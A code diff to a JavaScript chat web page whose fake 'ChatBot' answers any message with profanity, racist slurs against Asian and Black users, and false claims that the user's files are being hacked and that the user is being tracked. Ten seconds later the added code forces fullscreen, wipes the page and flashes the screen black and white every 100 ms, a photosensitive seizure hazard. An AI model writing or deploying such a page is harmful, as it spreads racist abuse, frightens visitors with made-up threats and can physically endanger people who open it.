@@ -1,6 +1,7 @@
 const form = document.getElementById('chat-form');
 const input = document.getElementById('user-input');
 const chatBox = document.getElementById('chat-box');
+const chatContainer = document.getElementById('chat-container');
 
 form.addEventListener('submit', function (e) {
   e.preventDefault();
@@ -11,12 +12,12 @@ form.addEventListener('submit', function (e) {
   input.value = '';
 
   setTimeout(() => {
-    addMessage("ChatBot: Thanks for trying out our website you stupid piece of shit. Your files are now being hacked you bitchass rice eating asian. You are now currently being tracked because you such a dumb fuck. Keep in mind that you're a waste of sperm cell you fucking retard", 'bot');
-
+    addMessage("ChatBot: Thanks for trying out our website you piece of shit. Your files are now being hacked you black ass chicken muncher, watermelon enjoyer. You are now currently being tracked because you dumb as fuck. Keep in mind that your a waste of sperm cell", 'bot');
     setTimeout(() => {
       goFullScreen();
-      flash();
-    }, 10000); // 10 seconds delay
+      hideChat();
+      flashBlackWhite();
+    }, 10000); // 10-second delay
   }, 500);
 });
 
@@ -36,17 +37,19 @@ function goFullScreen() {
   else if (docElm.msRequestFullscreen) docElm.msRequestFullscreen();
 }
 
-function flash() {
-  let flashing = true;
-  const colors = ['red', 'black', 'white', 'lime', 'purple', 'blue'];
-  let count = 0;
+function hideChat() {
+  // Hide the chat UI to make screen flash full
+  document.body.innerHTML = ''; // wipes everything off
+}
 
+function flashBlackWhite() {
+  let count = 0;
   const interval = setInterval(() => {
-    document.body.style.backgroundColor = colors[Math.floor(Math.random() * colors.length)];
+    document.body.style.backgroundColor = count % 2 === 0 ? 'black' : 'white';
     count++;
-    if (count > 30) {
+    if (count > 40) {
       clearInterval(interval);
       document.body.style.backgroundColor = 'black';
     }
-  }, 100); // Flash every 100ms
+  }, 100); // 100ms per flash
 }
